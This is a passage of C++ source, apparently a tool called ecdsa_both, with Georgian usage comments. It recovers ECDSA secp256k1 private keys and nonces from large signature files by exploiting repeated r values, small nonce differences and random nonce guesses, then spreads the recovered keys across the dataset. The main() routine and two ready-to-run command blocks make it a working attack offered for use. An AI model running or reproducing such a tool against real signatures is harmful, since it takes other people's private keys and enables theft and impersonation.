        else if(a=="--out-deltas") need(A.out_deltas);
        else if(a=="--export-clusters") need(A.export_clusters);
        else if(a=="--report-collisions") need(A.report_collisions);
        else if(a=="--dg-max-delta") needu(A.dg_max_delta);
        else if(a=="--dg-seeds"){ string s; need(s); A.dg_seeds = parse_u64_list(s); }
        else if(a=="--dg-fill-step") needu(A.dg_fill_step);
        else if(a=="--dg-per-pair-cap") needu(A.dg_per_pair_cap);
        else if(a=="--step-seeds"){ string s; need(s); A.step_seeds = parse_u64_list(s); }
        else if(a=="--enable-nopub") A.enable_nopub=true;
        else if(a=="--max-iter") needi(A.max_iter);
        else if(a=="--preload-k") need(A.preload_k_path);
        else if(a=="--scan-random-k") needu(A.scan_random_k);
        else if(a=="--scan-random-k-top") { uint64_t t; needu(t); A.scan_random_k_top=(size_t)t; }
        else if(a=="--scan-random-k-range"){ string s; need(s); A.scan_random_k_range = hex_to_int(s); if(A.scan_random_k_range<=0||A.scan_random_k_range>=N) A.scan_random_k_range=N-1; }
        else if(a=="--rand-seed") needu(A.rand_seed);
    }
    if(A.threads<=0) A.threads=1;
}

// --------- main ----------
int main(int argc, char** argv){
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    Args args; parse_args(argc,argv,args);

    // clean outputs
    for(const string& p: {args.out_json,args.out_txt,args.out_k,args.out_deltas}){
        ofstream(p, ios::trunc).close();
    }
    if(!args.export_clusters.empty()) ofstream(args.export_clusters, ios::trunc).close();
    if(!args.report_collisions.empty()) ofstream(args.report_collisions, ios::trunc).close();

    // bucketize
    string tmpdir = args.tmpdir.empty() ? string("/tmp/ecdsa_strict_") + to_string(::getpid()) : args.tmpdir;
    try {
        if (!tmpdir.empty()) fs::create_directories(tmpdir);
    } catch (const std::exception& e) {
        std::cerr << "[fatal] create_directories(" << tmpdir << "): " << e.what() << "\n";
        return 1;
    }

    cerr << "[pass0] bucketize -> " << tmpdir << " …\n";
    auto sum = bucketize_stream(args.sigs, tmpdir, args.buckets_by, 256);
    cerr << "[pass0] done. lines="<<sum.total<<" buckets="<<sum.files.size()<<"\n";

    // optional reports (fast & simple)
    if(!args.export_clusters.empty() || !args.report_collisions.empty()){
        export_clusters_and_collisions(args.sigs, args.export_clusters, args.report_collisions, args.min_count);
    }

    Secp S;

    // preload k
    unordered_map<string, unordered_set<string>> k_by_r_hex; // r_hex -> set(k_hex)
    if(!args.preload_k_path.empty()) preload_k(args.preload_k_path, k_by_r_hex);

    // recovered priv by pub (store both compressed & uncompressed on insert)
    unordered_map<string, cpp_int> recovered_by_pub;

    // delta schedule
    auto deltas = build_delta_schedule(args.dg_seeds, args.dg_max_delta,
                                       args.dg_fill_step, args.step_seeds,
                                       args.dg_per_pair_cap);

    // pass1: per bucket
    cerr << "[pass1] process buckets (primary + delta"<<(args.enable_nopub?"+nopub":"")<<") …\n";
    atomic<size_t> total_found{0};
    atomic<size_t> processed{0};
    // work queue with threads
    atomic<size_t> idx{0};
    vector<thread> workers;
    for(int t=0;t<args.threads;t++){
        workers.emplace_back([&](){
            while(true){
                size_t i = idx.fetch_add(1);
                if(i>=sum.files.size()) break;
                string fp = sum.files[i];
                auto rows = read_bucket(fp);
                size_t found=0;
                found += primary_dup_r(S, rows, args.out_json, args.out_txt, recovered_by_pub, k_by_r_hex);
                found += delta_scan_bucket(S, rows, deltas, args.dg_per_pair_cap, false,
                                           args.out_json, args.out_txt, args.out_deltas,
                                           recovered_by_pub, k_by_r_hex);
                if(args.enable_nopub){
                    found += delta_scan_bucket(S, rows, deltas, args.dg_per_pair_cap, true,
                                               args.out_json, args.out_txt, args.out_deltas,
                                               recovered_by_pub, k_by_r_hex);
                }
                total_found += found;
                size_t p=++processed;
                cerr << "[bucket " << (p) << "/" << sum.files.size() << "] rows="<<rows.size()<<" found="<<found<<"\n";
            }
        });
    }
    for(auto& th: workers) th.join();

    // dump current k_by_r_hex
    {
        for(auto& kv: k_by_r_hex){
            vector<cpp_int> ks; ks.reserve(kv.second.size());
            for(auto& h: kv.second) ks.push_back(hex_to_int(h));
            emit_k_candidates(args.out_k, hex_to_int(kv.first), ks);
        }
    }

    // pass2: propagation iterations
    cerr << "[pass2] propagation …\n";
    for(int it=1; it<=args.max_iter; ++it){
        auto p = propagate_stream(S, args.sigs, recovered_by_pub, k_by_r_hex,
                                  args.out_json, args.out_txt);
        cerr << "[iter "<<it<<"] grew_k="<<p.first<<", grew_keys="<<p.second<<"\n";
        if(p.first==0 && p.second==0) break;
        // append k snapshot
        for(auto& kv: k_by_r_hex){
            vector<cpp_int> ks; ks.reserve(kv.second.size());
            for(auto& h: kv.second) ks.push_back(hex_to_int(h));
            emit_k_candidates(args.out_k, hex_to_int(kv.first), ks);
        }
    }

    // random-k scan (optional)
    if(args.scan_random_k>0){
        vector<RCount> targets;
        if(args.scan_random_k_top==0) {
            for(auto& kv: sum.r_hist) targets.push_back({kv.first, kv.second});
        } else {
            targets = pick_top_r(sum.r_hist, args.scan_random_k_top);
        }
        cerr << "[random-k] threads="<<args.threads<<", per-bucket="<<args.scan_random_k
             << ", targets="<<targets.size()<<", range="<< int_to_hex64(args.scan_random_k_range) 
             << ", seed="<< args.rand_seed << "\n";
        atomic<size_t> new_keys{0};
        // split targets among threads
        vector<vector<RCount>> shards(args.threads);
        for(size_t i=0;i<targets.size();++i) shards[i%args.threads].push_back(targets[i]);
        vector<thread> ths;
        for(int t=0;t<args.threads;t++){
            ths.emplace_back([&,t](){
                uint64_t sd = args.rand_seed ^ (0x9e3779b97f4a7c15ULL * (t+1));
                random_k_worker(S, shards[t], args.sigs, args.scan_random_k,
                                args.scan_random_k_range, sd,
                                recovered_by_pub, k_by_r_hex,
                                args.out_json, args.out_txt, new_keys);
            });
        }
        for(auto& th: ths) th.join();
        cerr << "[random-k] new keys: " << new_keys << "\n";
    }

    // cleanup temp
    if(args.tmpdir.empty()){

        // უსაფრთხო წმენდა ბოლოს (არ წაშალო თუ ცარიელია ან “/”)
        try {

            if (!tmpdir.empty() && tmpdir != "/" && tmpdir != "." && fs::exists(tmpdir)) {

                std::error_code ec;
                fs::remove_all(tmpdir, ec);

            if (ec) {
                std::cerr << "[warn] remove_all(" << tmpdir << "): " << ec.message() << "\n";
            }
        }

        } catch (const std::exception& e) {

            std::cerr << "[warn] remove_all(" << tmpdir << "): " << e.what() << "\n";

            }

    }

    cerr << "Done.\n"
         << "Recovered keys -> " << args.out_json << " / " << args.out_txt << "\n"
         << "Recovered k    -> " << args.out_k << "\n"
         << "Delta insights -> " << args.out_deltas << "\n";
    return 0;
}


/*

1) მკაცრი, დეტერმინისტული პასი (dup-R + δ-scan + propagation)

ეს ეტაპი სწრაფია და ფეიკებს არ „შეუშვებს“ — ყველა ჰიპოთეზას ამოწმებს pub-ს, ალგებრას და r == x(k·G) შესაბამისობას:

./ecdsa_both \
  --sigs signatures_dedup.jsonl \
  --threads "$(nproc)" \
  --min-count 0 \
  --export-clusters dupR_clusters.jsonl \
  --report-collisions r_collisions.jsonl \
  --out-json recovered_keys.jsonl \
  --out-txt  recovered_keys.txt \
  --out-k    recovered_k.jsonl \
  --out-deltas delta_insights.jsonl \
  --max-iter 4 \
  --preload-k recovered_k.jsonl \
  --dg-max-delta 65536 \
  --dg-seeds 1,2,4,8,16,32,64,128,256,512,1024 \
  --dg-fill-step 1 \
  --dg-per-pair-cap 4096 \
  --step-seeds 3,5,7,9,17 \
  --enable-nopub


  ეს ჩაეშვება ბაკეტებით, მოძებნის (same r, same pub) დუბლიკატებს, შემდეგ δ-gradient/step სკანით სცდის (same pub, different r) წყვილებს, და ბოლოს propagation-ით გაავრცელებს ნაპოვნ d/k-ებს მთელ ფაილზე.



*/






/*



2) სურვილის მიხედვით — შემთხვევითი k სკანიც (სრული CPU დატვირთვით)

თუ გინდა გამდიდრდეს ძიება რანდომ-ჰიპოთეზებით, დაამატე ეს ფესვები (შეგიძლია იგივე ან ცალკე სტარტი):

./ecdsa_both \
  --sigs signatures.jsonl \
  --threads "$(nproc)" \
  --out-json recovered_keys.jsonl \
  --out-txt  recovered_keys.txt \
  --out-k    recovered_k.jsonl \
  --out-deltas delta_insights.jsonl \
  --max-iter 2 \
  --preload-k recovered_k.jsonl \
  --scan-random-k 250000 \
  --scan-random-k-top 0 \
  --scan-random-k-range 115792089237316195423570985008687907852837564279074904382605163141518161494337 \
  --rand-seed 1337


  შენიშვნა: --scan-random-k-top 0 ნიშნავს “ყველა r”. თუ გინდა ჯერ “ცხელი” r-ებით დაიწყო, სცადე --scan-random-k-top 128 (ან 64).

*/
